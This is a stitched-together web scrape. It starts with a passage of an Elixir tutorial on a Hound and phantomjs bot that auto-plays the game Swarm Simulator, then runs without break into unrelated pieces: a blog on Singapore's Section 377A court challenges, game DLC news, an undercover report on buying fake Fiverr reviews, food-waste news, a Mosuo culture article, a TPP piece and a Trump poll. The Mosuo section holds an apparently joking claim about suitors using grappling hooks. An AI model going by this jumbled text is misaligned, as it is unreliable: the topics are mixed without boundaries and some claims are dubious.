1 ) test Initial number of units should be three ( SwarmsimulatorbotTest ) test /swarmsimulatorbot_test.exs:6 ** ( exit ) exited in : GenServer.call ( Hound.SessionServer, { :change_session, #PID<0.175.0>, :default, %{}}, 60000) ** ( EXIT ) an exception was raised: ** ( MatchError ) no match of right hand side value: { :error, %HTTPoison.Error { id: nil, reason: :econnrefused }} ( hound ) lib/hound/request_utils.ex:43: Hound.RequestUtils.send_req/4 ( hound ) lib/hound/session_server.ex:67: Hound.SessionServer.handle_call/3 ( stdlib ) gen_server.erl:629: :gen_server.try_handle_call/4 ( stdlib ) gen_server.erl:661: :gen_server.handle_msg/5 ( stdlib ) proc_lib.erl:240: :proc_lib.init_p_do_apply/3 stacktrace: ( elixir ) lib/gen_server.ex:564: GenServer.call/3 ( swarmsimulatorbot ) lib/swarmsimulatorbot.ex:5: Swarmsimulatorbot.start/0 test /swarmsimulatorbot_test.exs:7 Finished in 0.1 seconds ( 0.08s on load, 0.1s on tests ) 1 test , 1 failure Randomized with seed 199589 20:17:32.354 [ error] GenServer Hound.SessionServer terminating ** ( MatchError ) no match of right hand side value: { :error, %HTTPoison.Error { id: nil, reason: :econnrefused }} ( hound ) lib/hound/request_utils.ex:43: Hound.RequestUtils.send_req/4 ( hound ) lib/hound/session_server.ex:67: Hound.SessionServer.handle_call/3 ( stdlib ) gen_server.erl:629: :gen_server.try_handle_call/4 ( stdlib ) gen_server.erl:661: :gen_server.handle_msg/5 ( stdlib ) proc_lib.erl:240: :proc_lib.init_p_do_apply/3 Last message: { :change_session, #PID<0.175.0>, :default, %{}} State: % {}
Apparently we forgot about one important element {:error, %HTTPoison.Error{id: nil, reason: :econnrefused}} should give us a clue what went wrong. Taking another look at hound documentation finally gives the explanation:
You'll need a webdriver server running
Let's start a webserver then by running the following command in another shell (we need to keep it running all the time from now on)
phantomjs --wd
mix test is finally green
Compiled lib/swarmsimulatorbot.ex . Finished in 1.2 seconds ( 0.07s on load, 1.1s on tests ) 1 test , 0 failures
Taking screenshots
We need to check the health of our swarm from time to time. I think the best way to do so is to make screenshots.
The test:
1 2 3 4 5 6 7 8 9 #file: test/swarmsimulatorbot_test.exs test " screenshot" do Swarmsimulatorbot . start f = " screenshots/test.png" Swarmsimulatorbot . screenshot ( " test.png" ) assert File . exists? ( f ) File . rm ( f ) Swarmsimulatorbot . stop end
I'm expecting mix test to complain about undefined function Swarmsimulatorbot.screenshot/1 . Let's add a missing function then.
1 2 3 4 5 6 #file: lib/swarmsimulatorbot.ex def screenshot ( path ) do show_all_units take_screenshot ( " screenshots/ #{ path } " ) end
We will only do screenshots on all units page for now as it's really enough to check our swarm conditions. We don't want to polute our root directory with some file images - this is why we will keep them in screenshots directory. Hound take_screenshot/1 helper function will take care about the rest.
Make sure you run mkdir screenshots before running tests. mix test should end with 2 tests, 0 failures .
Now we are ready to play with our Swarmsimulatorbot.screenshot/1 function in iex console
iex - S mix iex ( 1 ) > Swarmsimulatorbot . start nil iex ( 2 ) > Swarmsimulatorbot . screenshot ( " hello-buggies.png" ) " screenshots/hello-buggies.png" iex ( 3 ) > Swarmsimulatorbot . stop :ok
And if all went well you should endup with the image saved in your screenshots directory similar to this one
pretty neat! Looking at swarm is quite entertaining but we obviously want more - we want our BOT to actively grow our Swarm.
Growing the Swarm
If we want to grow our swarm we need to think about the strategy. How about?. Iterate over each unit and try to grow as many units as you can. Seems like a perfect starting strategy. It should be quite easy to implement - on each unit page find the last ‘clickable' button and click it. We will call our strategy dummy_grow/0
In our test we will expect population of drones would increase after first call of dummy_grow/0 function.
1 2 3 4 5 6 7 8 9 10 11 #file: test/swarmsimulatorbot_test.exs test " # dummy_grow the swarm" do Swarmsimulatorbot . start Swarmsimulatorbot . dummy_grow drone_text = Swarmsimulatorbot . units |> Enum . at ( 2 ) |> inner_text assert drone_text =~ ~r/Drone.*3/ Swarmsimulatorbot . stop end
We will fix test by implementing dummy_grow/0 function the following way.
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #file: lib/swarmsimulatorbot.ex def dummy_grow do units_size = length ( units ) - 1 Enum . each ( 0 .. ( units_size ), fn ( index ) -> units |> Enum . at ( index ) |> find_within_element ( :tag , " a" ) |> click active_buttons |> List . last |> click end ) end def active_buttons do find_all_elements ( :css , " a:not(.disabled).btn" ) end
And this change satisfies the tests. The drones are growing!
If you look closer at the dummy_grow/0 function you might have noticed there is some redundancy. It would be so much simpler just to iterate over Swarmsimulatorbot.units/0 and not call units/0 one more time in Enum.each/2 - that's very true, but apparently angularJS (the framework used for building Swarm simulator) reloads the page after each click. An attempt to iterate over units/0 and clicking it one by one would endup in error due to rest of the units not being present in DOM after first unit click.
Rest of the code seems quite self-explanatory. We have used some new hound helper functions and some standard Elixir programming to implement dummy grow functionality.
Kind of a server
We have written just enough to start iex session call Swarmsimulatorbot.dummy_grow/0 couple of times and take some screenshots to see that the swarm is actually growing. It is growing, isn't it?
Now what's left is to automate calling dummy_grow/0 and screenshot/1 . I think this is the most interesting part. We will write it using processes.
Here is the idea: we will use two processes. One for keeping the browser session, clicking the buttons, growing our Swarm and taking screenshots. The second process will be responsible for sending two types of messages periodically to the first process:
:grow message - send every couple of seconds. It will force the second process to call dummy_grow/0 function :screenshot message - send every minute. It will force the second process to call screenshot/1 function
Here are the implementation details:
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 #file: lib/swarmsimulatorbot.ex def start do spawn_link __MODULE__ , :init , [] end def init do Hound . start_session navigate_to ( @swarm_url ) execute_script ( " localStorage.clear()" ); loop end defp loop do receive do { :screenshot , path } -> screenshot ( path ) loop { :grow } -> dummy_grow loop { :stop } -> stop end end
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #file: lib/swarmsimulatorbot/cli.ex defmodule Swarmsimulatorbot . Cli do @tick 1000 @screenshot_tick 60000 def start do spawn_link __MODULE__ , :main , [] end def main do bot_pid = Swarmsimulatorbot . start :timer . send_interval ( @tick , bot_pid , { :grow }) :timer . send_interval ( @screenshot_tick , bot_pid , { :screenshot , " growing.png" }) end end
So - what is going on here. First of all I have moved the start/0 logic to init/0 function and let start/0 to spawn a process for us (apparently it is some kind of standard in Elixir world). The key change was adding private function loop/0 this is a ‘place' where a process will listen for incoming messages. Recursive calling of loop/0 is just a way of saying we want to recieve messages all the time and we don't want to stop after receiving the first message.
The Swarmsimulatorbot.Cli module is responsible for:
starting the Swarmsimulatorbot process periodically send messages to Swarmsimulatorbot process using :timer.send_interval/3 function
And believe me or not - this is the end of the part I. Let's try this out in iex
iex - S mix iex ( 1 ) > Swarmsimulatorbot . Cli . start #PID<0.157.0>
And here is how my swarm stats looks like after about an hour of BOT running.
Sweet!
Unfortunatelly my BOT just stopped due to phantomjs timeout error.
07 : 49 : 20.798 [ error ] Process #PID<0.158.0> raised an exception ** ( MatchError ) no match of right hand side value: { :error , % HTTPoison .

Second of two 377A challenges may have to wait a long time for a decision
Wednesday, 6 March 2013, was the day Tan Eng Hong's challenge to the constitutionality of Section 377A was heard in closed court. Section 377A of the Penal Code is the law that criminalises “gross indecency” between two men.
This follows quite soon after the court date for another challenge to the same law, mounted by Gary Lim and Kenneth Chee and reported in First of two 377A challenges heard in closed court.
In the Tan Eng Hong case, there are pages and pages of arguments, but my sense, on reading them, is that the issue is being distilled to a few crucial points. And these crucial points are not specific to the “gay issue”, but will prove important to any future constitutional challenge that is based on Article 12 (the equality provision) of our constitution.
The first crucial point is the level of scrutiny. This is a somewhat technical matter, but basically, the Attorney-General's Chambers, in defending the constitutionality of Section 377A, urges the court to accord a “strong presumption of constitutionality” to legislative acts. That is to say, statutes passed by parliament should be presumed to be constitutional unless there is absolutely nothing that can support it. The AG argues that so long as a single shred of justification can be found to provide reason for a piece legislation, even if a discriminatory one, and even if all the other reasons for it have been found nonsensical, the court must find the legislation constitutional.
Tan Eng Hong argues the court should apply strict scrutiny. This is because, he submits, Section 377A is a law that on its face is discriminatory as the “statute purports to classify an individual only on the basis of an immutable attribute” — and his submission also goes to great lengths to demonstrate that homosexual orientation is an immutable attribute. A strict scrutiny test in effect reverses the burden of proof. It is for the AG to demonstrate that it does not violate the equality provision. Tan Eng Hong as plaintiff then lays out several ways in which Section 377A discriminates arbitrarily, thus inviting the AG to disprove each and everyone of these — should strict scrutiny be the standard.
It will be interesting to see how the court decides this question of the level of scrutiny, because it will set a precedent when it comes to any other challenge on equality grounds.
The argument over the level of scrutiny is necessarily developed with very fine and technical excursions. One interesting line was taken by the AG in its submission (para 33) when it said, in effect, that Singapore courts have never accepted that it has a role in determining “legitimate state interest”. This half-hidden line is far more important than it looks, because strict scrutiny cannot proceed if courts remove themselves from any review of legitimate state interest — precisely what the AG is trying to do. Why can't it proceed? Because, if a court has to decide whether discrimination is justifiable or not, the court must also decide: justifiable for what purpose? Some purposes are legitimate; other purported purposes (e.g. imprisoning people because the majority think they look ugly) are not. If courts are ousted from being able to review whether the asserted state interest is legitimate, then courts can never arrive at any determination whether discrimination is justifiable or unjustifiable/unconstitutional.
Fortunately, Tan Eng Hong's lawyer M Ravi strenuously argued that in Commonwealth jurisdictions, courts have not relinquished such a role, urging the Singapore court likewise not to.
Another major area surfaced by this case is over the question of laws purporting to further morality. The AG argues that legislatures have always passed laws in the interest of morality. When the Singapore Parliament debated Section 377A within this frame, showing that the intent of keeping Section 377A was related to morals, it was a perfectly legitimate exercise of state power.
Tan Eng Hong had two different responses to this. In his submission, he makes a case for distinguishing between incontrovertible morality and “morality” that is not incontrovertible. Rape, slashing, poisoning and murder are examples of incontrovertible morality, but erotic gay relationships are not in the same class; it is “a particular group's vision of morality,” he says in supplementary submission. Large numbers of Singaporeans do not consider this a moral question. Tan Eng Hong also demonstrates how even among Christian churches, divergent views prevail. Homosexuality is not a question of incontrovertible morality; that being the case, Section 377A is arbitrarily supportive of merely one view. Arbitrariness is a major reason to strike down laws as unconstitutional.
Interestingly, in his oral arguments, M Ravi was reported to have taken a new angle, and perhaps a very important one. He pointed out to the judge that the Singapore Constitution allows no morality exception to the equality provision. This is unlike Article 14 — the part that guarantees freedom of speech and association — which contains a subsection 14(2) saying that Parliament may make laws that impose restrictions in the interest of morality. This exception, he argued, only applies to the guarantee of speech and association freedom. Article 12 — the equality provision — by contrast contains no such exemption; it is absolute. This means that our constitution does not permit Parliament to pass discriminatory laws purportedly in the interest of morality.
—
A little bird has just told me that Justice Quentin Loh is close to issuing his decision on the first challenge — that by Gary Lim and Kenneth Chee — which was heard in court in February. His decision may be released within this month (March 2013).
As most observers believe, whichever way his decision goes, it will likely go to appeal.
In that event, will he hold back on deciding Tan Eng Hong vs Attorney-General? It would seem logical, so that in his eventual Tan Eng Hong his decision, he can be guided by the Appeal Court's reasoning.
Bravely Default: Flying Fairy Will Have Downloadable Content
By Spencer . August 6, 2012 . 1:58pm
Square Enix is extending their DLC to Bravely Default: Flying Fairy, which will have additional character specific equipment. Some extra content will be bundled with the game's music CDs.
If you purchase the single "Linked Horizon" you'll get a Noble Composer outfit for Lingabel.
The official Bravely Default soundtrack includes a code to use the Freelancer outfits for all four heroes even if they have a different job.
These costumes will be available to everyone after December 13 if you reach a certain point in the game.
Agnes also has a Orthodox Knight costume, which you can unlock using a product code bundled with Bravely Default: Flying Fairy.
It's unclear how (or if?) you can get the Orthodox Knight costume if you get a used copy of Bravely Default. Bravely Default: Flying Fairy comes out for Nintendo 3DS on October 11.

If you live in the Bay Area and have looked for something special to spice up a birthday party, you might have discovered the Freakin' Awesome Karaoke Express, a truck that promises to deliver an unbelievable selection of songs to your doorstep. You might have seen a review on Yelp that said it's perfect for a girl's night out or a Facebook review that mentioned it being a crowd-pleaser at a neighborhood block party. You may have been impressed by its 19,000 Twitter followers, and considered hiring this mobile song-slinging truck to drive up to your next outdoor shindig.
What you probably didn't realize was that there is no such thing as the Freakin' Awesome Karaoke Express (or F.A.K.E., for short). I made it up and paid strangers to pump up its online footprint to make it seem real. I didn't do it to scam anyone or even for the LULZ. I wanted to see firsthand how the fake reputation economy operates. The investigation led me to an online marketplace where a good reputation comes cheap.
For $5, I could get 200 Facebook fans, or 6,000 Twitter followers, or I could get @SMExpertsBiz to tweet about the truck to the account's 26,000 Twitter fans. A Lincoln could get me a Facebook review, a Google review, an Amazon review, or, less easily, a Yelp review.
I found all these offers on Fiverr.com, a "global online marketplace for creative and professional services." Launched in 2010 by two Tel Aviv-based entrepreneurs, Fiverr has raised $50 million in venture capital to give a platform to freelancers who want to hawk their services. Most of the gigs there start at $5; Fiverr makes its money by taking 20% of the payment for any gig as its commission. Fiverr's front page offers a variety of sample gigs: "SEO articles," freelance press release writing, and album cover design work, but I was just interested in the fake reputation gigs.

When I identified myself as a journalist and sent messages to people offering to write reviews, they said, ‘We only do real reviews. We really try the products. People send them to us.' But when I approached them undercover with money in hand, it was a different matter.
Fusion's art department came up with a logo and photoshopped a truck. Armed with that, a new Gmail account and a burner phone number, I created a Yelp profile, a Facebook page, a Twitter account, and a page on Launchrock–a start-up that encourages you to make a website before your product is real to gauge interest for it. And I set up Google Analytics so I saw that someone from Yelp visited the Launchrock page before letting my Yelp profile go live. I assume they wanted to make sure the business was "real.” And these days, which is more real: a fake business with a real website or a brick and mortar business with no online presence?

Then I set about finding out how hard it was to make this fake business look like it was thriving. I posted a work request on Fiverr saying I needed help with my online reputation and I started messaging people who offered Facebook fans, Twitter followers and positive reviews. They all went by pseudonyms on the site, but they all had photos of themselves, star ratings based on past work, and short bios that said where they lived and usually describing themselves as "experienced writers." Many were based in the U.S. and described themselves as professional writers. I wondered if these wheelers and dealers in lies could actually fool tech companies that have spent the last few years cracking down on inauthenticity on their sites.
They are well aware of the problem. "Fake friends now command real money," wrote the New York Times last year. Twitter prohibits the buying and selling of followers. Facebook has made going after fake likes a priority. A 2015 Harvard study said that Yelp identified 16% of reviews as fake; Yelp has been particularly aggressive about fighting them, going so far as to shame businesses that have bought them with a kind of digital Scarlet Letter for 90 days. Amazon has been so aggressive in its data-mining to get rid of unfairly positive reviews, such as those by author's friends, that it has scared people when finding incredibly loose connections between individuals.

But we use reviews, followings and recommendations to decide where to go and what to buy, so many businesses feel like they have to buy reputation credibility to succeed. According to surveys by Nielsen, 68% of people rely on online reviews and 93% of the visitors to Yelp usually decide to make a purchase after visiting the site. Harvard Business School's Michael Luca found that a one-star increase in a Yelp rating led to a 5 to 9 percent bump in revenue for a restaurant. Three out of four consumers surveyed by Bright Locals said that positive customer reviews make them trust a business more.
I'm not the first to set up a fake business as a honeypot for fake reviews. In 2013, the New York attorney general's office went undercover for “Operation Clean Turf.” Pretending to be a fro-yo place in Brooklyn plagued with negative reviews, the office called up “SEO shops” asking for help burnishing its online reputation. Many of them wrote fake reviews, using IP maskers and cheap freelancers abroad. At the end of that investigation, the attorney general fined 19 companies from $2,500 to $100,000 each for breaking business laws.
Yes, writing fake reviews is illegal. False advertising is a misdemeanor crime. You can be fined up to $5,000 for it and spend six months in jail, or more if it's your second offense. Even writing a real review where you don't reveal that you were compensated to do it violates guidelines set forth by the Federal Trade Commission, which is one of the reasons why it wasn't kosher for Kim Kardashian to pose on Instagram with her favorite morning sickness pills.

But lots of people are still doing it. Technology research firm Gartner thinks that 10-15% of all reviews online are fake.
For months, @awesome_karaoke depressingly tweeted to 0 followers. But after paying $21 to one of these guys…
Advertisement
… the truck gained more than 19,000 followers over night. The $21 bill for the gig included rush delivery.
My sudden surge in popularity raised no flags at Twitter headquarters as far as I could tell, even though many of the followers had egg avatars who hadn't tweeted in years.

For another Lincoln, a guy in L.A. took a photo of himself with the F.A.K.E. logo in front of a food truck, perfectly willing to pose just right to make it look like it was my business truck. No questions asked. His $5 gig was for two photos, but he happily sent along four.

I picked up 200 Facebook fans for $5 and glowing 5-star reviews on Yelp and Facebook; my only guidance when I paid up was that they note our “unbelievable selection of songs.” The rest was their invention.“This is a great place to get your groove on,” wrote a woman on Yelp. They called the nonexistent song-slewing truck fantastic and amazing and praised our wonderful service. But they also added details that made the reviews look real: they had stories in them, about hiring the truck to sing with colleagues during a conference and for a kid's birthday party.
The people who reviewed F.A.K.E. on Facebook, I noted, had also given five stars to a chiropractor in Arizona, a hair salon in London, a limo company in North Carolina, a realtor in Texas, and a locksmith in Florida, among other far-flung businesses.

Facebook says it uses pattern recognition to find and eliminate click farms and accounts that exist solely to like pages. Since March, says Facebook, it's “notified 200,000 Pages that we've protected their accounts from fake likes.” I love the way they put this: “Protected,” as if the companies hadn't paid for them. Facebook didn't manage to protect me from fake likes.
Yelp was the only company that caught us, hiding both of the reviews I bought behind their “not recommended” click wall and not counting them in F.A.K.E.'s rating. It has software that screens out suspicious reviews, not including them in a company's star-rating. If they see too many of them, they will penalize a business's page, putting a “consumer alert” on the profile for 90 days warning visitors that they think the business is buying fake reviews. People on Fiverr who were selling reviews would often say “No Yelp” in their descriptions, saying it was hard to make those "stick."

Even so, I got numerous real phone calls and voicemails to the burner number I set up for the karaoke truck. The Internet had breathed life into this fake business and people wanted to hire it.
“What do you charge? I have a birthday coming up and a karaoke truck would be awesome,” said one message from a guy named Brandon. I felt bad! I wish it existed. Even though I never returned the calls of Brandon or any of the other people who wanted to hire the truck, they didn't leave the business a negative review.

Yelp analytics informed me that based on the clicks on the Karaoke Express Yelp profile, the F.A.K.E.'s estimated revenue in August was over $500. It encouraged me to place ads on Yelp to increase my business.
After I was finished with my fake shopping spree, I attempted to interview people on Fiverr who sold fake reputation. As I should have expected on such a transactional platform, many of them said they'd talk to me only if I paid them. One sent me a gig offer: $100 for an exclusive interview. I explained I couldn't pay them for interviews, unfortunately.

I tried repeatedly to get in touch with Fiverr about this story, but a spokesperson from Inkhouse, its PR firm, said, "This isn't something Fiverr can comment on right now."
A 23-year-old guy named Dinesh, who sells 7,500 Twitter followers for $5 told me he lived in Jaipur, India and had been on Fiverr since March 2012. He claimed he'd created 5 million Twitter accounts using scripts, and had completed 10,000 Fiverr orders for Twitter followers. He'd been banned from Fiverr three times before but says he doesn't know why.
I also talked to the woman who'd written a Yelp review that said F.A.K.E. was “perfect for a girl's night out." She didn't initially know I was also behind the karaoke truck.

A married mother of two teenagers, her name was Melinda. She lived in California and had been working on Fiverr for six months, usually about 15 to 20 hours a week, she said. She finished high school but not college. She writes books, and has self-published two cookbooks and two adult romance novels. She had a high voice like a little girl.
She said she'd written over 100 reviews. When I asked for examples, she said a race car toy, Santa Claus outfits for silverware, and a Bluetooth-powered patch for finding keys. Once someone sent her an unmarked bottle full of white pills that were supposed to improve the health of her hair and nails. She says she refused to review that one and sent it back.
Melinda said she'd always used the products because otherwise she couldn't give an “honest review.” But I knew from my investigation that wasn't true. And even if she did actually try a product, according to the AG's office, it's illegal for her to review products that she's paid to review unless she discloses her compensation.

I eventually came clean with her, and told her that I had hired her undercover and that she had written a completely fake review for my karaoke truck. She was silent for a while and then told me she thought it was real because it had a website. She said she's sympathetic to new businesses that need reviews to get first-time customers through the door.
"I don't mind helping out a new business or a business that doesn't have much of an internet reputation, even if I haven't been there before," she said. "Plus, businesses need positive reviews sometimes, because people are more likely to leave a negative review than a positive one."
She said though that she planned to quit Fiverr once her books take off and she gets more of a following as an author. I asked her if she's ever bought a review on Fiverr for one of her books.

“No," she said. “I'd rather have a no-name Joe come across my books and leave his random feedback. If someone doesn't like it, I want them to tell me that.”
That response surprised me given the business she's in. I asked her if she worried about the effect of paid positive reviews on the overall marketplace, given how often people rely on reviews on Amazon, Yelp and elsewhere to decide how to spend their money and time.
"Everyone online needs to use their best judgment," she said. “Just because a product has good reviews doesn't mean it's good. You can't believe everything you read online.”

It was disturbingly easy to set up a business online and make it look real. The people who called the Freakin' Awesome Karaoke Express and never got a call back didn't leave negative reviews or report us to Yelp or Facebook as closed. The platforms didn't figure out my business didn't exist and for the most part, they didn't seem to figure out that the purchased reviews, fans, and followers were fake.
And that wasn't even the point. What I really wondered was how hard it was to buy a fake positive reputation. And the answer is: not hard. For less than an expensive dinner out at a 5-star restaurant, I gave a completely invented business a sterling online reputation.

Businesses' desperate need to have an impressive digital presence has allowed a black market for lies to flourish. Online reviews are crucial to a business's survival, and social media followings matter. A bad review can hurt a bottom line. If everyone else's reputation is artificially pumped up, legitimate businesses may start feeling pressured to engage in the dark arts of reputation management just to keep up.
Now that I've seen the Internet's deception marketplace, it's going to haunt me. When I see a review online, unless it's written by someone I know and trust—which apparently isn't Kim Kardashian—I'm always going to be wondering whether I'm looking at a review from a satisfied customer or an undercover paid promoter. While platforms like Yelp and Facebook engage in an arms race to catch and filter out fishy fans, we'll have to take Melinda's advice and take praises from strangers with a pinch of digital salt. An unfortunate effect of the ability to buy effusive praise is the diminishment of accolades that come legitimately.

LONDON (Thomson Reuters Foundation) - A war on waste food in France, where supermarkets are banned from throwing away unsold food and restaurants must provide doggy bags when asked, has helped it secure the top spot in a ranking of countries by their food sustainability.
Japan, Germany, Spain and Sweden rounded out the top five in an index published the Economist Intelligence Unit (EIU), which graded 34 nations based on food waste, environment-friendly agriculture and quality nutrition.
It is “unethical and immoral” to waste resources when hundreds of millions go hungry across the world, Vytenis Andriukaitis, EU Commissioner for Health and Food Safety, said at the launch of the Food Sustainability Index 2017 on Tuesday.
“We are all responsible, every person and every country,” he said in the Italian city of Milan, according to a statement.
One third of all food produced worldwide, 1.3 billion tons per year, is wasted, according to the U.N.'s Food and Agriculture Organization.
Food releases planet-warming gases as it decomposes in landfills. The food the world wastes accounts for more greenhouse gas emissions than any country except for China and the United States.
“What is really important is the vision and importance of (food sustainability) in these governments' agendas and policies,” Irene Mia, global editorial director at the EIU, told the Thomson Reuters Foundation.
“It's something that is moving up in governments' agendas across the world.”
Global hunger levels rose for the first time in more than a decade, last year, with 815 million people, more than one in 10 on the planet, going hungry.
France was the first country to introduce specific food waste legislation and loses only 1.8 percent of its total food production each year. It plans to cut this in half by 2025.
“France has taken some important and welcome steps forward including forcing supermarkets to stop throwing away perfectly edible food,” said Meadhbh Bolger, a campaigner at Friends of the Earth Europe.
“This needs to be matched at the European level with a EU-wide binding food waste reduction target.”
High-income countries performed better in the index, but the United States lagged in 21st place, dragged down by poor management of soil and fertilizer in agriculture, and excess consumption of meat, sugar and saturated fats, the study said.
The United Arab Emirates, despite having the highest income per head of the 34 countries, was ranked last, reflecting high food waste of almost 1,000 kilos per person per year, rising obesity and an agriculture sector dependent on depleting water resources, it said.
Mosuo girl weaver in old-town Lijiang
The Mosuo (Chinese: 摩梭; pinyin: Mósuō) are a small ethnic group living in Yunnan and Sichuan provinces in China, close to the border with Tibet. Dubbed the 'Kingdom of Women' by the Chinese,[1]:2 the Mosuo population of about 50,000 live near Lugu Lake in the Tibetan Himalayas .
Scholars use diverse terms and spellings to designate the Mosuo culture. Most prefer 'Mosuo' some spell it 'Moso', while a minority use neither term, but refer to them as the Na people.
The Mosuo people are known as the 'Kingdom of Women' because the Na are a matrilineal society: heterosexual activity occurs only by mutual consent and mostly through the custom of the secret nocturnal 'visit';[2] men and women are free to have multiple partners,[2] and to initiate or break off relationships when they please.[citation needed]
The origin of matrilineality/matriarchal [ edit ]
Introduction [ edit ]
Matrilineal cultures trace descent through the female line. It can also be considered a society in which one identifies with one's mother's lineage including familial lineage or property inheritance.
Matriarchal cultures are run by women. Women hold primary power, predominate in roles of political leadership, moral authority, social privilege and control of property at the specific exclusion of men, at least to a large degree.
Technically, Mosuo culture is matrilineal, but many anthropologists classify the Mosuo tribe as a "matriarchal society".[3] The Mosuo themselves sometimes use the term matriarchal to describe their culture in order to bring more tourism and interest into their culture. Mosuo culture does have characteristics of a matriarchal society, in that women are the head of the household, the property is passed down through the female line, and the women make business decisions; yet political power tends to be in the hands of males, disqualifying them from matriarchy status.[4] Nevertheless, some anthropologists, like Peggy Reeves Sanday, determine that societies like Mosuo are in fact matriarchies. They note that, rather than a simple mirror of a patriarchal society, a matriarchy "emphasizes maternal meanings where 'maternal symbols are linked to social practices influencing the lives of both sexes and where women play a central role in these practices'".[5] These scholars thus favour redefining and reintroducing the word matriarchy, especially in reference to modern matrilineal societies like the Mosuo.
Matrilineality [ edit ]
Mosuo people
Beginning of Mosuo matrilineality [ edit ]
The Mosuo are a small ethnic group living around China's Lugu Lake in the provinces of Sichuan and Yunnan. Most Mosuo people celebrate a matrilineal culture, tracing lineage through the female side of the family.[6]
Historically the Mosuo lived in a feudal system where a larger peasant population was controlled by a small nobility. The nobility was afraid of the peasant class gaining power. Since leadership was hereditary, the peasant class was given a matriarchal system. This prevented threats to nobility power by having the peasant class trace lineage through the female line. This system has led to numerous distinct traits among Mosuo society.
Mosuo girls become Mosuo women [ edit ]
A Mosuo girl is considered a woman after she has participated in the coming of age ceremony. This ceremony, observed between the ages of 12 and 14, marks a Mosuo girl's transition to womanhood as well as a Mosuo man's transition into manhood. Here women are introduced to skirts and men to pants.
Prior to the coming of age ceremony, Mosuo children dress the same and are restricted from certain aspects of Mosuo life, namely religious ceremonies.
After the coming of age ceremony, Mosuo women are allowed their own private bedroom within the household in which they live; men are not afforded this advantage.
Mosuo 'marriage' [ edit ]
The Mosuo men practice tisese which misleadingly translates as walking marriage in Chinese. However, the Mosuo term literally means 'goes back and forth'.
Women have the choice to invite men of interest to their private sleeping room. If the man does not reciprocate this desire, he may simply never visit the woman's household. Men perform tisese in the true sense of the word. They can seek entry into the sleeping chambers of any woman they desire who also desires them. When feelings are reciprocal, a man will be allowed into a woman's private sleeping area.[7] There he will spend the night and walk back to his mother's home in the early morning.[citation needed]
Male suitors have been known to commonly descend into a woman's bedding chamber from a designated opening in the ceiling, commonly using a grappling hook, or modern rock climbing apparatus.
Anthropologist Cai Hua termed tisese as 'furtive' or 'closed' visiting, meaning no public acknowledgement or obligations are required between parties. At night Mosuo adults are free to experience sexuality with as many or as few partners as they wish.
Though a Mosuo woman is allowed to change partners whenever she likes, having only one sexual partner is not uncommon. Typically walking marriages are long term. During these unions a woman may become pregnant by the same man multiple times. But when children are born, they become a responsibility of the woman's family. Instead of marrying and sharing family life with spouses, adult Mosuo children remain in extended, multigenerational households with their mother and her blood relatives.
Typical Mosuo home [ edit ]
Mosuo matrilineality is largely based on the woman's role as head of the household. The Mosuo generally live in large extended families with many generations under one roof. Children in a household are taken care of by their mother's family. Their only male influences are their mother's brothers.[clarification needed]
Women who have participated in the coming of age ceremony are allotted a private room. Otherwise the typical Mosuo home consists of communal quarters, with no other private bedrooms or living areas.
Mosuo anthropology [ edit ]
Walking marriage vs. monogamous marriage [ edit ]
Anthropologists believe the premodern Mosuo family system has withstood modern Chinese marriage practices (identical to Western monogamous marriages) for many reasons. The practice of walking marriage allows two people to pursue intimacy as equals purely for the sake of satisfaction.
Mosuo family principles challenge some of the world's most popular beliefs about marriage, parenting, and family life. The following are convictions about marriage that scholars, politicians, and citizens from the East and West (including traditional Chinese patriarchy) believe are true of family and kinship:[8]
Marriage is a universal institution.
The quality and stability of a couple's marriage profoundly affects their children's welfare and security.
Parents who engage in multiple, short-term, extra-marital sexual liaisons irresponsibly threaten their children's emotional development.
The Mosuo family life offers an exception that questions these convictions. Traditional Mosuo families value sexuality and romance separate from domesticity, parenting, caretaking, and economic situation. A Mosuo woman's sex life is strictly voluntary and nocturnal while her family life is a daily obligation.[9]
Mosuo culture and female sexual freedom [ edit ]
The practice of tisese allows Mosuo women to avoid the double standard that regulates women's sexuality in other cultures. Women's sexual behaviors are judged equally. Girls and boys alike are raised learning to express sexuality to the same degree.[10]
The traditional Mosuo family and kinship affords women an equality and agency over their sexual and procreative lives that is rare in most cultures. Romantic and sexual unions are governed solely by the woman and man involved. Other family members are unconcerned with the romantic lives of their offspring.
Mosuo women enjoy freedom from reproductive demands that is foreign to most Chinese cultures.
Today [ edit ]
Though the practice of tisese is a traditional Mosuo practice, today many couples have redefined the term. Many choose to cement their intimate bond through a small ceremony during which, in keeping with the secrecy of nocturnal visits, a representative of the man presents gifts to his lover's kin.[11] After many presents have been given, the ceremony allows a man to openly visit his lover to assist with daily tasks or visit with her household. Still, whenever a man spends the night with a lover, even after such ceremony, he must return to his maternal residence in the morning.
Tourism [ edit ]
On Lake Lugu
The rural area of the Mosuo Lugu Lake has only recently experienced modern developments. When the society became known as the 'Kingdom of Women', tourists began to flock to the area. The Mosuo responded to these visitors by building hotels and other attractions to bring more visitors. Many Mosuo women make a living managing these hotels.
The idea of 'walking marriages' has convinced many visitors that the Mosuo lead a salacious sexual life. It is common for visitors to flirt with the local Mosuo women in an effort to seduce them.

Indeed, news of Monday's TPP deal may have left both economic heavyweights feeling slighted.
If anybody had a doubt that China was left out of the TPP on purpose, they need only refer to President Barack Obama's views for proof, Herrero said. In an official statement on Tuesday, the U.S. leader said "when more than 95 percent of our potential customers live outside our borders, we can't let countries like China write the rules of the global economy."

To be sure, Beijing was initially invited to join but policymakers were unwilling to comply with the strict international standards imposed, a factor that makes its participation unlikely in the near future.
"Faced with strong growth headwinds, emerging Asian economies don't want their hands being tied up by the non-trade elements in the TPP package," explained BBVA economists in a note, referring to policies such as tighter protection of intellectual property rights.
"These economies prefer to maintain political and macro stability while undergoing domestic structural rebalancing in the wake of a turbulent global financial environment," BBVA continued.
Europe isn't likely to hop on board either seeing as it's already negotiating with Washington on another major trade pact, the Transatlantic Trade and Investment Partnership (TTIP), and because many of the TPP negotiation benchmarks reached by the U.S. won't be acceptable to European leaders, Herrero added.
Trump Fails To Reach Beyond Base As Independents' Disapproval Grows
Enlarge this image toggle caption Joe Raedle/Getty Images Joe Raedle/Getty Images
President Trump's support among independent voters has eroded since he took office. Though he still clings to a loyal base of supporters, his overall disapproval among Americans has reached record highs, according to a new NPR/PBS NewsHour/Marist poll.
Just 37 percent of Americans approve of the job Trump is doing just over five months into his tenure, while 51 percent disapprove. Forty percent of those polled strongly disapprove of Trump's performance, twice the 20 percent who strongly approved.

